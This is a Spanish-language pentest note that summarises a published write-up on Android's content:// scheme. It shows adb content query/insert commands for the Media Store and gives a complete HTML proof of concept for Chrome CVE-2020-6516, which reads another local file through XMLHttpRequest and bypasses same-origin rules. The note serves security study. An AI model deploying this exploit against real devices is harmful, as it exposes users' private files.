---
title: content:// protocol
date: 2024-11-25
category: ['pentest mobile', 'android']
tags: []
summary: content:// protocol
---

Este es un resumen de la publicación https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/

Listando Archivos en Media Store
Para listar archivos gestionados por Media Store, se puede usar el siguiente comando:

```html
$ content query --uri content://media/external/file
```

Para una salida más amigable para el usuario, mostrando solo el identificador y la ruta de cada archivo indexado:

```html
$ content query --uri content://media/external/file --projection _id,_data
```

Los proveedores de contenido están aislados en su propio espacio de nombres privado. El acceso a un proveedor requiere la URI específica content://. La información sobre las rutas para acceder a un proveedor se puede obtener de los manifiestos de la aplicación o del código fuente del marco de Android.

Acceso de Chrome a Proveedores de Contenido
Chrome en Android puede acceder a proveedores de contenido a través del esquema content://, lo que le permite acceder a recursos como fotos o documentos exportados por aplicaciones de terceros. Para ilustrar esto, se puede insertar un archivo en el Media Store y luego acceder a él a través de Chrome:

Inserte una entrada personalizada en el Media Store:

```html
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
Descubre el identificador del archivo recién insertado:
```

```html
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```

El archivo se puede ver en Chrome utilizando una URL construida con el identificador del archivo.

Por ejemplo, para listar archivos relacionados con una aplicación específica:

```html
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```

Chrome CVE-2020-6516: Bypass de la Política de Mismo Origen
La Política de Mismo Origen (SOP) es un protocolo de seguridad en los navegadores que restringe a las páginas web de interactuar con recursos de diferentes orígenes a menos que se permita explícitamente mediante una política de Compartición de Recursos de Origen Cruzado (CORS). Esta política tiene como objetivo prevenir filtraciones de información y falsificación de solicitudes entre sitios. Chrome considera content:// como un esquema local, lo que implica reglas SOP más estrictas, donde cada URL de esquema local se trata como un origen separado.

Sin embargo, CVE-2020-6516 fue una vulnerabilidad en Chrome que permitió eludir las reglas SOP para recursos cargados a través de una URL content://. En efecto, el código JavaScript de una URL content:// podía acceder a otros recursos cargados a través de URLs content://, lo que representaba una preocupación de seguridad significativa, especialmente en dispositivos Android que ejecutaban versiones anteriores a Android 10, donde el almacenamiento con alcance no estaba implementado.

La prueba de concepto a continuación demuestra esta vulnerabilidad, donde un documento HTML, después de ser subido bajo /sdcard y agregado a la Media Store, utiliza XMLHttpRequest en su JavaScript para acceder y mostrar el contenido de otro archivo en la Media Store, eludiendo las reglas SOP.

Prueba de Concepto HTML:

```html
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```